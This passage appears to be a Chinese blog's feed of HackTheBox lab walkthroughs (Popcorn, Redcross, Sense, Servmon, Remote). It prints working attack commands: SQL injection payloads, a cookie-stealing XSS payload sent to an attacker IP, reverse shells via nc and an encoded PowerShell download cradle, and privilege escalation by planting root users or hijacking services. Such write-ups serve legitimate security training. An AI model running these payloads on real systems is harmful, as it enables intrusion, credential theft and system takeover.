<p>尝试上传webshell</p>
<p><img src="/images/Popcorn/8.png" alt="8"></p>
<p>成功，之后果然找到了路径</p>
<p><img src="/images/Popcorn/9.png" alt="9"></p>
<p>查看</p>
<p><img src="/images/Popcorn/10.png" alt="10"></p>
<p>获取shell</p>
<p><img src="/images/Popcorn/11.png" alt="11"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/Popcorn/12.png" alt="12"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ubuntu 9.10</span><br><span class="line">2.6.31-14-generic-pae</span><br></pre></td></tr></table></figure>

<p><img src="/images/Popcorn/13.png" alt="13"></p>
<p>发现linux PAM提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dpkg -l |grep pam</span><br></pre></td></tr></table></figure>

<p>尝试使用14339.sh进行提权</p>
<p>直接运行会报错<code>No such file or directory</code></p>
<p><img src="/images/Popcorn/14.png" alt="14"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi 14339.sh</span><br><span class="line">:set ff</span><br><span class="line">:set ff&#x3D;unix</span><br><span class="line">:wq!</span><br></pre></td></tr></table></figure>

<p>就能获得root</p>
<p><img src="/images/Popcorn/15.png" alt="15"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Redcross</title>
    <url>/2020/10/29/HTB-Redcross/</url>
    <content><![CDATA[<h1 id="Redcross"><a href="#Redcross" class="headerlink" title="Redcross"></a>Redcross</h1><p>我觉得非常有意思的一台，有多种攻击路线，还能用到XSS，而且难度不是很高</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>添加hosts</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.113    intra.redcross.htb redcross.htb</span><br></pre></td></tr></table></figure>

<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Redcross/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>登录首页，发现了疑似文件名参数</p>
<p><img src="/images/Redcross/2.png" alt="2"></p>
<p>证书提示了某个用户名</p>
<p><img src="/images/Redcross/3.png" alt="3"></p>
<p>目录枚举，知道对方在使用php，添加扩展名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gobuster dir -u https:&#x2F;&#x2F;intra.redcross.htb&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;zidian.txt -x .php -o dir.txt -t 10 -k</span><br></pre></td></tr></table></figure>

<p>但这样枚举效率很低，有更好的字典作为选择</p>
<p>枚举php文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gobuster dir -u https:&#x2F;&#x2F;intra.redcross.htb&#x2F; -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;Common-PHP-Filenames.txt -o dir.txt -t 10 -k </span><br></pre></td></tr></table></figure>

<p><img src="/images/Redcross/4.png" alt="4"></p>
<p>没有枚举出太多，检查源代码</p>
<p><img src="/images/Redcross/5.png" alt="5"></p>
<p>发现还有一个/pages/目录下，存在php文件，继续枚举该目录</p>
<p><img src="/images/Redcross/6.png" alt="6"></p>
<p>发现了更多的文件，其中存在login.php</p>
<p><img src="/images/Redcross/7.png" alt="7"></p>
<p>可以发现，之前首页包含的就是这个文件，不过该参数测试后，应该不存在文件包含漏洞</p>
<p>进行常规目录枚举</p>
<p><img src="/images/Redcross/8.png" alt="8"></p>
<p>发现了documentation目录，不过不显示文件</p>
<p><img src="/images/Redcross/9.png" alt="9"></p>
<p>对于改文件名，应该枚举常见文档格式pdf，txt</p>
<p><img src="/images/Redcross/12.png" alt="12"></p>
<p>发现了pdf</p>
<p><img src="/images/Redcross/13.png" alt="13"></p>
<p>使用wfuzz进行子域名枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wfuzz -H &#39;HOST: FUZZ.redcross.htb&#39; -u &#39;https:&#x2F;&#x2F;10.10.10.113&#39; -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;DNS&#x2F;shubs-subdomains.txt --hw 28</span><br></pre></td></tr></table></figure>

<p><img src="/images/Redcross/14.png" alt="14"></p>
<p>得到了admin子域</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="第一步-成功登录到admin域"><a href="#第一步-成功登录到admin域" class="headerlink" title="第一步:成功登录到admin域"></a>第一步:成功登录到admin域</h3><p>回到最初的登录页面，已知的用户名<code>penelope</code>，尝试一些登录凭据组合</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">password</span><br><span class="line">guset</span><br><span class="line">anonymous</span><br></pre></td></tr></table></figure>

<p><code>guest/guest</code>可以成功登录，或者之前的pdf的描述，提供了一个功能</p>
<p>标题输入credentials，内容输入username=</p>
<p><img src="/images/Redcross/21.png" alt="21"></p>
<p>会告诉你临时凭据</p>
<p><img src="/images/Redcross/22.png" alt="22"></p>
<h4 id="方法1-guset登录SQL注入"><a href="#方法1-guset登录SQL注入" class="headerlink" title="方法1:guset登录SQL注入"></a>方法1:guset登录SQL注入</h4><p>登录成功发现一处查询点</p>
<p><img src="/images/Redcross/10.png" alt="10"></p>
<p>疑似容易受到sql注入攻击，并且数据库为MariaDB，且闭合应该为<code>&#39;)</code></p>
<p><img src="/images/Redcross/11.png" alt="11"></p>
<p>尝试sql报错注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;) and updatexml(1,concat(0x7e,version(),0x7e),1)#</span><br><span class="line">&#39;) and extractvalue(0x0a,concat(0x7e,version(),0x7e))#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Redcross/15.png" alt="15"></p>
<p>中间过程省略</p>
<p>爆用户名，一切正常</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;) and updatexml(1,concat(0x7e,(select username from redcross.users limit 0,1),0x7e),1)#</span><br><span class="line">&#39;) and updatexml(1,concat(0x7e,(select username from redcross.users limit 1,1),0x7e),1)#</span><br></pre></td></tr></table></figure>

<p>爆密码有些不一样</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;) and updatexml(1,concat(0x7e,(select username from redcross.users limit 0,1),0x7e),1)#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Redcross/16.png" alt="16"></p>
<p>得到<code>$2y$10$z/d5GiwZuFqjY1jRiKIPzuPX</code>，没有显示完全，可以使用substring()</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;) and updatexml(1,concat(0x7e,(select substring((select password from redcross.users limit 0,1)from 30)),0x7e),1)#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Redcross/17.png" alt="17"></p>
<p>得到<code>Kt0SthLOyU438ajqRBtrb7ZADpwq.</code></p>
<p>组合在一起就是<code>$2y$10$z/d5GiwZuFqjY1jRiKIPzuPXKt0SthLOyU438ajqRBtrb7ZADpwq.</code></p>
<p><code>hash-identifier</code>没有识别出哈希类型，直接放到john去破解</p>
<p>破解出了charles用户的密码，这个哈希加密类型是blowfish加密，之破解出了charles的密码</p>
<p><code>$2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i</code>:<code>cookiemonster</code></p>
<p><img src="/images/Redcross/18.png" alt="18"></p>
<p>尝试使用sqlmap进行自动化注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -r sqli -p &#39;o&#39; --force-ssl --dbms mysql --batch</span><br></pre></td></tr></table></figure>

<p>但是这里报错了，看起来是找到正确的注入点，但是对方停止了响应</p>
<p><img src="/images/Redcross/19.png" alt="19"></p>
<p>查看后是对方的waf或者其他安全策略，把我们给BAN了，所以sqlmap挂了</p>
<p>这里可以通过delay设置请求之间等待时间，这会让攻击时间变长，因为原来请求之间没有时间间隔</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -r sqli --force-ssl --dbms mysql --batch --delay&#x3D;1</span><br></pre></td></tr></table></figure>

<p>这样sqlmap可以正常使用</p>
<p><img src="/images/Redcross/20.png" alt="20"></p>
<p>使用charles的凭据进行登录，页面没有多出可以操作的东西</p>
<p>但是提示了alerts，联想到XSS</p>
<p><img src="/images/Redcross/23.png" alt="23"></p>
<p>尝试凭据登录admin域，失败</p>
<p><img src="/images/Redcross/25.png" alt="25"></p>
<p>将intra域的<code>PHPSESSID</code>替换到admin域的<code>PHPSESSID</code>，刷新页面，可以直接以charles的身份登录</p>
<p><img src="/images/Redcross/24.png" alt="24"></p>
<h4 id="方法2-guest会话固定"><a href="#方法2-guest会话固定" class="headerlink" title="方法2:guest会话固定"></a>方法2:guest会话固定</h4><p>intra域guest的<code>PHPSESSID</code>也可以直接登录到admin域的页面，这里谁的身份都无所谓，功能都能使用</p>
<p><img src="/images/Redcross/26.png" alt="26"></p>
<h4 id="方法3-XSS"><a href="#方法3-XSS" class="headerlink" title="方法3:XSS"></a>方法3:XSS</h4><p>之前给guest凭据的类似留言板的功能，存在XSS，这是一个盲打XSS的情况，可以直接窃取到管理员的cookie</p>
<p>这里需要注意，xss的地点在电话那一栏，其他地方没有用。paylaod</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;new Image().src&#x3D;&#39;http:&#x2F;&#x2F;10.10.16.4&#x2F;&#39;+document.cookie&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Redcross/28.png" alt="28"></p>
<p>之后登录cookie登录admin域就是admin</p>
<p><img src="/images/Redcross/29.png" alt="29"></p>
<h3 id="第二步-shell"><a href="#第二步-shell" class="headerlink" title="第二步:shell"></a>第二步:shell</h3><p>首先有一个用户管理功能，可以添加用户</p>
<p><img src="/images/Redcross/30.png" alt="30"></p>
<p>但是权限很低，基本啥都干不了</p>
<p><img src="/images/Redcross/31.png" alt="31"></p>
<h4 id="方法1-防火墙→Haraka-RCE"><a href="#方法1-防火墙→Haraka-RCE" class="headerlink" title="方法1:防火墙→Haraka RCE"></a>方法1:防火墙→Haraka RCE</h4><p>页面有防火墙添加白名单功能，输入自己的ip，重新进行端口扫描，发现了新的端口</p>
<p><img src="/images/Redcross/32.png" alt="32"></p>
<p>1025没有得到指纹，尝试用nc或者telnet获得banner</p>
<p><img src="/images/Redcross/34.png" alt="34"></p>
<p>等了比较久的时间，发现了haraka，知道公开漏洞</p>
<p><img src="/images/Redcross/33.png" alt="33"></p>
<p>需要修改默认端口</p>
<p><img src="/images/Redcross/35.png" alt="35"></p>
<p>之后反弹shell，需要制定知道的邮箱地址<code>penelope@redcross.htb</code>，后来测试发现，用之前创建的用户<code>test@redcross.htb</code>也可以</p>
<p>这个反弹shell非常慢，使用nc进行反弹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python 41162.py -c &quot;cd &#x2F;tmp;wget http:&#x2F;&#x2F;10.10.16.4&#x2F;nc; chmod 777 .&#x2F;nc; .&#x2F;nc 10.10.16.4 443 -e &#x2F;bin&#x2F;bash&quot; -t penelope@redcross.htb -m 10.10.10.113</span><br></pre></td></tr></table></figure>

<p>获得shell</p>
<p><img src="/images/Redcross/36.png" alt="36"></p>
<h4 id="方法2-命令注入"><a href="#方法2-命令注入" class="headerlink" title="方法2:命令注入"></a>方法2:命令注入</h4><p>添加防火墙白名单尝试进行命令注入，添加处注入失败</p>
<p><img src="/images/Redcross/37.png" alt="37"></p>
<p>deny处添加成功</p>
<p><img src="/images/Redcross/38.png" alt="38"></p>
<p>反弹shell命令即可</p>
<p><img src="/images/Redcross/39.png" alt="39"></p>
<p>不过这里权限更低一些</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>首先想到找凭据，因为之前mysql注入得到了MariaDB的内容，但是里面的凭据不能登录admin</p>
<h3 id="方法1-设置uid"><a href="#方法1-设置uid" class="headerlink" title="方法1:设置uid"></a>方法1:设置uid</h3><p>首先找到postgresql</p>
<p><img src="/images/Redcross/40.png" alt="40"></p>
<p>找到mysql的凭据，不能切换用户，其他和sql注入一致</p>
<p><img src="/images/Redcross/41.png" alt="41"></p>
<p>搜索postgresql的连接函数pg_connect，可以找到凭据，在<code>/var/www/html/admin/pages/actions.php</code></p>
<p><code>unixusrmgr/dheu%7wjx8B&amp;</code>和<code>www/aXwrtUO9_aa&amp;</code>，肯定用高权限</p>
<p><img src="/images/Redcross/42.png" alt="42"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">psql -h 127.0.0.1 -U unixusrmgr unix</span><br><span class="line">dheu%7wjx8B&amp;</span><br></pre></td></tr></table></figure>

<p>之后找到常用命令:<a href="https://blog.csdn.net/u010856284/article/details/70142810">https://blog.csdn.net/u010856284/article/details/70142810</a></p>
<p>之后找到了有意思的信息</p>
<p><img src="/images/Redcross/43.png" alt="43"></p>
<p>数据库存在uid和gid信息，还存在密码信息，密码格式为MD5(Unix)，尝试创建一个uid和gid为0的用户</p>
<p>先生成密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#openssl passwd -1 evil</span><br><span class="line">$1$H9HOvdAx$zqLN&#x2F;10955pMhZmGVvxrE0</span><br></pre></td></tr></table></figure>

<p>再尝试插入，但权限不足</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INSERT INTO passwd_table (username, passwd, uid, gid, homedir) values (&#39;evil&#39;, &#39;$1$H9HOvdAx$zqLN&#x2F;10955pMhZmGVvxrE0&#39;, 0, 0, &#39;&#x2F;tmp&#39;);</span><br></pre></td></tr></table></figure>

<p><img src="/images/Redcross/44.png" alt="44"></p>
<p>查看权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\dt</span><br></pre></td></tr></table></figure>

<p>发现只能修改4个参数，其中不包括UID</p>
<p><img src="/images/Redcross/45.png" alt="45"></p>
<p>所以修改一下命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INSERT INTO passwd_table (username, passwd, gid, homedir) values (&#39;evil&#39;, &#39;$1$H9HOvdAx$zqLN&#x2F;10955pMhZmGVvxrE0&#39;, 0, &#39;&#x2F;tmp&#39;);</span><br></pre></td></tr></table></figure>

<p><img src="/images/Redcross/46.png" alt="46"></p>
<p>使用<code>evil/evil</code>进行ssh登录，获得了gid权限</p>
<p><img src="/images/Redcross/47.png" alt="47"></p>
<p>linpeas扫描，注意conf文件和密码文件，可以发现另一处postgresql凭据</p>
<p><img src="/images/Redcross/48.png" alt="48"></p>
<p>使用它们去登录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">psql -h 127.0.0.1 -U unixnssroot unix</span><br><span class="line">30jdsklj4d_3</span><br></pre></td></tr></table></figure>

<p>发现这次可以修改gid了</p>
<p><img src="/images/Redcross/49.png" alt="49"></p>
<p>尝试修改uid权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update passwd_table set uid&#x3D;0 where username&#x3D;&#39;evil&#39;;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Redcross/50.png" alt="50"></p>
<p>重新ssh，但是不行，uid没变，尝试重新创建一个uid0用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#openssl passwd -1 hacker1337!</span><br><span class="line">$1$PiRTDXDx$w8le9W0F7o9VeOI.bcfA61</span><br></pre></td></tr></table></figure>

<p>最好也别把目录设置成<code>/tmp</code>了，目录一致可能有问题，需要把之前的uid0给改掉，这是一个primary key </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INSERT INTO passwd_table (username, passwd, uid, gid, homedir) values (&#39;hacker&#39;, &#39;$1$PiRTDXDx$w8le9W0F7o9VeOI.bcfA61&#39;, 0, 0, &#39;&#x2F;&#39;);</span><br></pre></td></tr></table></figure>

<p><img src="/images/Redcross/51.png" alt="51"></p>
<p>成功提权</p>
<h3 id="方法2-设置gid"><a href="#方法2-设置gid" class="headerlink" title="方法2:设置gid"></a>方法2:设置gid</h3><p>有很多的组都有很大几率获得权限提升:<a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe">https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe</a></p>
<p>查看sudo组编号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">evil@redcross:&#x2F;var&#x2F;www&#x2F;html&#x2F;admin&#x2F;pages$ cat &#x2F;etc&#x2F;group |grep sudo</span><br><span class="line">sudo:x:27:</span><br></pre></td></tr></table></figure>

<p>创建sudo组用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INSERT INTO passwd_table (username, passwd, gid, homedir) values (&#39;sudoo&#39;, &#39;$1$YRdG0wu4$.7lHDv1rbDHgghX1iv5eS&#x2F;&#39;, 27, &#39;&#x2F;tmp&#x2F;tmp&#39;);</span><br></pre></td></tr></table></figure>

<p>ssh过去，发现sudo权限为all</p>
<p><img src="/images/Redcross/52.png" alt="52"></p>
<h2 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h2><p>还有ROP chain的bof，超出能力范围</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Sense</title>
    <url>/2020/06/18/HTB-Sense/</url>
    <content><![CDATA[<h1 id="Sense"><a href="#Sense" class="headerlink" title="Sense"></a>Sense</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Sense/1.jpg" alt="1"></p>
<p>HTTP和HTTPS两个web服务<br>并且http会重定向到https</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Sense/2.jpg" alt="2"></p>
<p>网站主页存在登录会话，其他没任何发现<br>进行目录枚举</p>
<p><img src="/images/Sense/3.jpg" alt="3"></p>
<p>发现了了两个有意思的文件</p>
<p>首先是changelog.txt</p>
<p><img src="/images/Sense/4.jpg" alt="4"></p>
<p>提示网页是存在漏洞的<br>另一个是system-users.txt<br><img src="/images/Sense/5.jpg" alt="5"></p>
<p>直接找到了用户的账号和密码，不过密码提示是默认密码</p>
<p>Google一下就可以找到，密码为pfsense，账号为rohit(小写)</p>
<p><img src="/images/Sense/6.jpg" alt="6"></p>
<p>登录之后，还可以得到版本 2.1.3</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h3><p><img src="/images/Sense/7.jpg" alt="7"></p>
<p>寻找到了公开漏洞，发现是一个python3脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 43560.py --rhost 10.10.10.60 --lhost 10.10.16.173 --lport 4444 --username rohit --password pfsense</span><br></pre></td></tr></table></figure>

<p>直接利用即可</p>
<p><img src="/images/Sense/8.jpg" alt="8"></p>
<p>直接获取了root</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Servmon</title>
    <url>/2020/10/28/HTB-Servmon/</url>
    <content><![CDATA[<h1 id="Servmon"><a href="#Servmon" class="headerlink" title="Servmon"></a>Servmon</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Servmon/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>21端口ftp允许匿名登录，下载所有文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget --mirror --no-passive-ftp &#39;ftp:&#x2F;&#x2F;anonymous:anonymous@10.10.10.184&#39;</span><br></pre></td></tr></table></figure>

<p>提示Nathan的桌面有密码文件</p>
<p><img src="/images/Servmon/2.png" alt="2"></p>
<p>网站有一些没有配置的东西</p>
<p><img src="/images/Servmon/3.png" alt="3"></p>
<p>80端口发现</p>
<p><img src="/images/Servmon/4.png" alt="4"></p>
<p>8443发现NSClient++，好像是一个监控系统</p>
<p><img src="/images/Servmon/9.png" alt="9"></p>
<p>而且提示了找回密码的方法</p>
<p><img src="/images/Servmon/10.png" alt="10"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>寻找公开漏洞</p>
<p><img src="/images/Servmon/5.png" alt="5"></p>
<p>得到目录遍历，可以利用它查看任何文件</p>
<p><img src="/images/Servmon/6.png" alt="6"></p>
<p>现在尝试读取21端口提示的密码</p>
<p><img src="/images/Servmon/7.png" alt="7"></p>
<p>得到了一些凭证，现在尝试登录</p>
<p>这台windows比较特殊，存在SSH服务，可以利用hydra或者msf进行ssh爆破，得到凭证<code>nadine/L1k3B1gBut7s@W0rk</code></p>
<p>和windows的特性一样，ssh用户名不区分大小写</p>
<p><img src="/images/Servmon/8.png" alt="8"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>之前有一个方法可以找回密码，直接去寻找</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir &#x2F;A&#x2F;S nscp.exe</span><br></pre></td></tr></table></figure>

<p>得到位置</p>
<p><img src="/images/Servmon/11.png" alt="11"></p>
<p>执行之前的命令，找回密码</p>
<p><img src="/images/Servmon/12.png" alt="12"></p>
<p>尝试登录，但仍然失败</p>
<p><img src="/images/Servmon/13.png" alt="13"></p>
<p>去查看配置文件，通常是.ini结尾</p>
<p><img src="/images/Servmon/14.png" alt="14"></p>
<p>发现了密码，发现了IP白名单，只允许本地登录，我们可以在kali上，进行本地端口转发</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184</span><br></pre></td></tr></table></figure>

<p>端口开发，访问打不开</p>
<p><img src="/images/Servmon/15.png" alt="15"></p>
<p>使用https，成功登录</p>
<p><img src="/images/Servmon/16.png" alt="16"></p>
<p>之后提权参考46802.txt，不过各种工具都被AV干掉了，如果没执行就等一等，或者查看modules组件情况，再点一下queries看看</p>
<p>太晚了，后面有空再作免杀吧，只好先读个flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type C:\Users\Administrator\Desktop\root.txt &gt; C:\Temp\flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="/images/Servmon/17.png" alt="17"></p>
<p>这机子被改过了，别人NC一波结束，我免杀了半个小时没过defender，哎。</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Remote</title>
    <url>/2020/10/28/HTB-Remote/</url>
    <content><![CDATA[<h1 id="Remote"><a href="#Remote" class="headerlink" title="Remote"></a>Remote</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Remote/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>手动检查21ftp，允许匿名登录，但是没有文件，不允许上传</p>
<p><img src="/images/Remote/2.png" alt="2"></p>
<p>smb不允许匿名登录，也不允许空登录，也不允许guest登录</p>
<p><img src="/images/Remote/3.png" alt="3"></p>
<p>NFS枚举</p>
<p><img src="/images/Remote/4.png" alt="4"></p>
<p>似乎是网站的备份文件，应该是很重要的信息了，但是没有写权限</p>
<p>再去检查80</p>
<p><img src="/images/Remote/5.png" alt="5"></p>
<p>得到Umbraco CMS</p>
<p>尝试目录枚举，第一次失败了，可能触发了什么安全机制<br>更换小一点的字典，降低线程数，可以完成枚举</p>
<p><img src="/images/Remote/6.png" alt="6"></p>
<p>之后得到登录页面</p>
<p><img src="/images/Remote/7.png" alt="7"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>nfs的目录是一个很好的突破点</p>
<p><img src="/images/Remote/8.png" alt="8"></p>
<p>找到了存在凭据的文件，文件不能直接读</p>
<p><img src="/images/Remote/9.png" alt="9"></p>
<p>通过strings，可以找到sha1的哈希</p>
<p><img src="/images/Remote/10.png" alt="10"></p>
<p>strings似乎并没有失去一些字符</p>
<p><img src="/images/Remote/11.png" alt="11"></p>
<p>破解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">john hash --format&#x3D;Raw-SHA1 --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure>

<p><img src="/images/Remote/12.png" alt="12"></p>
<p>凭据<code>admin@htb.local / baconandcheese</code>可以登录</p>
<p><img src="/images/Remote/13.png" alt="13"></p>
<p>在<code>Umbraco.sdf</code>中，似乎还发现了CMS版本</p>
<p><img src="/images/Remote/14.png" alt="14"></p>
<p>这样可以找到一个版本相同，且需要验证的漏洞</p>
<p><img src="/images/Remote/15.png" alt="15"></p>
<p>修改exp</p>
<p><img src="/images/Remote/16.png" alt="16"></p>
<p>如果<code>cmd /c</code>，否则RCE会失败</p>
<p><img src="/images/Remote/17.png" alt="17"></p>
<p>之后修改payload反弹powershell，注意转义</p>
<p><img src="/images/Remote/18.png" alt="18"></p>
<p>获得shell</p>
<p><img src="/images/Remote/19.png" alt="19"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>powerup不好使，会出错，winpeas可以</p>
<h3 id="Insecure-Service-Properties"><a href="#Insecure-Service-Properties" class="headerlink" title="Insecure Service Properties"></a>Insecure Service Properties</h3><p><img src="/images/Remote/20.png" alt="20"></p>
<p>生成shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter_reverse_tcp LHOST&#x3D;10.10.16.98 LPORT&#x3D;443 -f exe -o shell.exe</span><br></pre></td></tr></table></figure>

<p>注意powershell下得使用sc.exe查看服务，而不是sc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc.exe qc UsoSvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/Remote/21.png" alt="21"></p>
<p>修改路径</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc.exe config UsoSvc binpath&#x3D; &quot;C:\Users\Public\Downloads\shell.exe&quot;</span><br></pre></td></tr></table></figure>

<p>重启服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net stop UsoSvc</span><br><span class="line">net start UsoSvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/Remote/22.png" alt="22"></p>
<p>服务提权shell容易不稳定，最好migrate</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set AutoRunScript post&#x2F;windows&#x2F;manage&#x2F;migrate</span><br></pre></td></tr></table></figure>

<p>获得system</p>
<p><img src="/images/Remote/23.png" alt="23"></p>
<p>powershell反弹shell很稳定</p>
<p>先生成base64编码的反弹指令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;iex( IWR http:&#x2F;&#x2F;10.10.16.98&#x2F;winpriv&#x2F;Invoke-PowerShellTcp.ps1 -UseBasicParsing)&quot; | iconv -t UTF-16LE | base64 -w0</span><br></pre></td></tr></table></figure>

<p><code>cmd /c</code>比较重要，直接powershell会出错，用<code>-EncodedCommand</code>进行解压</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc.exe config UsoSvc binpath&#x3D; &quot;cmd &#x2F;c powershell -EncodedCommand aQBlAHgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADYALgA5ADgALwB3AGkAbgBwAHIAaQB2AC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA&#x3D;&quot;</span><br><span class="line">net start UsoSvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/Remote/24.png" alt="24"></p>
<h3 id="SeImpersonatePrivilege"><a href="#SeImpersonatePrivilege" class="headerlink" title="SeImpersonatePrivilege"></a>SeImpersonatePrivilege</h3><p>考虑到目标版本比较新，使用roguepotato</p>
<p>这里需要指定CLSID，目标是<code>Windows Server 2019 Standard</code>，但是<code>Windows_10_Pro</code>和<code>Windows_10_Enterprise</code>某些CLSID仍然可用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\roguepotato.exe -r 10.10.16.98 -c &quot;&#123;B91D5831-B1BD-4608-8198-D72E155020F7&#125;&quot; -e &quot;cmd &#x2F;c powershell -EncodedCommand aQBlAHgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADYALgA5ADgALwB3AGkAbgBwAHIAaQB2AC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA&#x3D;&quot; -l 9999</span><br></pre></td></tr></table></figure>

<p><img src="/images/Remote/25.png" alt="25"></p>
